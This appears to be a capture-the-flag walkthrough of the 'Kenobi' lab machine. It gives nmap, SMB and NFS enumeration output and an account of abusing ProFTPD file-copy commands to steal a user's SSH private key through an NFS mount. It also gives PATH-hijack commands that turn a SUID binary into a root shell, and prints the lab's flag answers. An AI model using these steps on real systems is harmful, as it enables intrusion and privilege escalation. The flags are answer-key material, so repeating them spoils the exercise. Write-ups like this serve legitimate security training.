# Kenobi

### Deploy the vulnerable machine
- Scan the machine with nmap, how many ports are open?

          nmap 10.10.93.61 --min-rate=2000 -n -Pn  
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 06:58 EDT
        Nmap scan report for 10.10.93.61
        Host is up (0.047s latency).
        Not shown: 993 closed tcp ports (conn-refused)
        PORT     STATE SERVICE
        21/tcp   open  ftp
        22/tcp   open  ssh
        80/tcp   open  http
        111/tcp  open  rpcbind
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
`7`

### Enumerating Samba for shares
- Using the nmap command above, how many shares have been found?

      nmap --script smb-enum-shares.nse -p445 10.10.93.61
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 07:00 EDT
      Nmap scan report for 10.10.93.61
      Host is up (0.052s latency).
      
      PORT    STATE SERVICE
      445/tcp open  microsoft-ds
      
      Host script results:
      | smb-enum-shares: 
      |   account_used: guest
      |   \\10.10.93.61\IPC$: 
      |     Type: STYPE_IPC_HIDDEN
      |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
      |     Users: 1
      |     Max Users: <unlimited>
      |     Path: C:\tmp
      |     Anonymous access: READ/WRITE
      |     Current user access: READ/WRITE
      |   \\10.10.93.61\anonymous: 
      |     Type: STYPE_DISKTREE
      |     Comment: 
      |     Users: 0
      |     Max Users: <unlimited>
      |     Path: C:\home\kenobi\share
      |     Anonymous access: READ/WRITE
      |     Current user access: READ/WRITE
      |   \\10.10.93.61\print$: 
      |     Type: STYPE_DISKTREE
      |     Comment: Printer Drivers
      |     Users: 0
      |     Max Users: <unlimited>
      |     Path: C:\var\lib\samba\printers
      |     Anonymous access: <none>
      |_    Current user access: <none>
      
      Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
  `3`

- Once you're connected, list the files on the share. What is the file can you see? <br />
![image](https://github.com/user-attachments/assets/be5aece6-70a3-4d49-aeb1-57ed2279cf89)<br />
`log.txt`. This file shows us some interesting commands used by the user 'kenobi' to create ssh keys: <br />
![image](https://github.com/user-attachments/assets/50276114-ff1a-452b-8a4b-edc1a5c870f1) <br />

- What port is FTP running on? `21`
- What mount can we see?

      nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.61
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 07:06 EDT
      Nmap scan report for 10.10.93.61
      Host is up (0.047s latency).
      
      PORT    STATE SERVICE
      111/tcp open  rpcbind
      | nfs-showmount: 
      |_  /var *
      
      Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
`/var`

### Gain initial access with ProFtpd
- Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version? <br />
![image](https://github.com/user-attachments/assets/9710dfaa-b739-4f29-9d4f-fe7a6b95b79f)<br />
`1.3.5`
- We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running? <br />
![image](https://github.com/user-attachments/assets/d1833b74-ba1d-4f3b-8a33-6cc4eced42aa)<br />
`4`
- What is Kenobi's user flag (/home/kenobi/user.txt)? <br />
The ProFTPD version implements the SITE CPFR and SITE CPTO commands, with copies and moves files directly on the server. Since we have access to the NFS share on /var/, and since we know from the `log.txt` file that the user 'kenobi' created an ssh key pair, we can move the private key inside the nfs shared file system.
![image](https://github.com/user-attachments/assets/61ee75fa-800d-4f24-b157-4ca2414d02a5) <br />
Now let's try to mount the nfs file system to see if we can find the id_rsa file we just moved:

      mkdir mnt 
      mkdir mnt/kenobiNFS
      sudo mount 10.10.93.61:/var mnt/kenobiNFS
      ls -la mnt/kenobiNFS/tmp
And there we have our private key: <br />
![image](https://github.com/user-attachments/assets/7799aa03-c720-49eb-93b9-b90f209dc957)<br />
We can now use it to log into kenobi's account: 

    cp mnt/kenobiNFS/tmp/id_rsa .
    chmod 600 id_rsa
    ssh -i id_rsa kenobi@10.10.93.61
![image](https://github.com/user-attachments/assets/b07caa29-f1a6-4601-ab98-d30e4b2f4e0e) <br />
The user flag is: `d0b0f3f53b6caa532a83915e19224899`



### Privilege Escalation with Path Variable Manipulation
- What file looks particularly out of the ordinary?
      
      find / -perm -04000 2>/dev/null
        /sbin/mount.nfs
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/snapd/snap-confine
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/openssh/ssh-keysign
        /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
        /usr/bin/chfn
        /usr/bin/newgidmap
        /usr/bin/pkexec
        /usr/bin/passwd
        /usr/bin/newuidmap
        /usr/bin/gpasswd
        /usr/bin/menu
        /usr/bin/sudo
        /usr/bin/chsh
        /usr/bin/at
        /usr/bin/newgrp
        /bin/umount
        /bin/fusermount
        /bin/mount
        /bin/ping
        /bin/su
        /bin/ping6

`/usr/bin/menu`
- Run the binary, how many options appear? <br />
![image](https://github.com/user-attachments/assets/87d17135-8d5f-49ad-8d68-a0c0051dc7ae)<br />
`3`
- What is the root flag (/root/root.txt)? <br />
If we run the `strings` command on the binary, we can see that the program calls the "curl" command, but it does not call the full path of curl (/usr/bin/curl), but calls the relative path, since it's in the same directory <br />
![image](https://github.com/user-attachments/assets/e07db223-9b1c-41b2-83ec-383286d457ba) <br />
We can exploit this by creating a file named "curl" inside another folder, for example /tmp, and then modify our environment variable $PATH, by adding /tmp at the beginning of PATH. So here's the list of commands to run:

      cd /tmp
      echo "/bin/sh" > curl
      export PATH=/tmp:$PATH

  ![image](https://github.com/user-attachments/assets/c61791fd-abf9-42cc-83e9-bfe6041e065c)<br />
  Run `cat /root/root.txt` to get the root flag: `177b3cd8562289f37382721c28381f02`

